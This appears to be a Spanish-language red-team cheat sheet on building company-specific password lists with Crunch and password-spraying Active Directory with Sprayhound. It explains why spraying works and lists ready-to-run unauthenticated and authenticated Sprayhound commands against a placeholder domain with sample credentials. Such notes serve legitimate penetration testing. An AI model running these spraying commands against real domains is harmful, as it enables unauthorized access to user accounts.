# Contraseñas personalizadas 

Tags: #AD #PasswordSpraying #CustomPassword #Crunch #Kali #Parrot 

* [Crunch](https://www.kali.org/tools/crunch/)
* [Sprayhound](https://github.com/Hackndo/sprayhound)

```bash 
La generación de contraseñas personalizadas para una empresa y su uso en operaciones de red team (equipo rojo) es crucial por varias razones:

1. 'Simulación Realista': Las contraseñas personalizadas que reflejan las políticas y prácticas de una empresa específica permiten a los equipos rojos simular ataques más realistas y efectivos, proporcionando una evaluación precisa de la resistencia de la empresa contra técnicas comunes de ataque.
    
2. 'Identificación de Vulnerabilidades': Al usar contraseñas que son representativas de las utilizadas en la organización, el equipo rojo puede identificar debilidades específicas en las políticas de contraseñas y prácticas de los empleados.
```

```  bash 
Realizar password spraying después de detectar una contraseña común en la empresa puede ser extremadamente poderoso:

1. 'Alto Potencial de Éxito': Si una contraseña es comúnmente utilizada dentro de la empresa, el password spraying con esta contraseña incrementa significativamente las posibilidades de obtener acceso no autorizado.
    
2. 'Exposición de Malas Prácticas': Demuestra la vulnerabilidad de la organización a ataques de bajo esfuerzo y alto impacto, subrayando la importancia de políticas de contraseñas más fuertes y educación en seguridad para los empleados.
```

```bash 
# No autenticado 
# Single user, single password
sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP>

# User list, single password
sprayhound -U ./users.txt -p Pentest123.. -d Domain01.local -dc <IP>

# User as pass
sprayhound -U ./users.txt -d Domain01.local -dc <IP>

# User as pass with password lowercase
sprayhound -U ./users.txt --lower -d Domain01.local -dc <IP>

# User as pass with password uppercase
sprayhound -U ./users.txt --upper -d Domain01.local -dc <IP>
```

```bash 
# Autenticado 
# Single user, single password
sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# All domain users, single password
sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# All domain users, single password, using an account from a trusted domain
sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu 'babdcatha.net\Babd' -lp P4ssw0rd

# User as pass on all domain users
sprayhound -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# User as pass with password lowercase
sprayhound --lower -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd

# User as pass with password uppercase
sprayhound --upper -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
```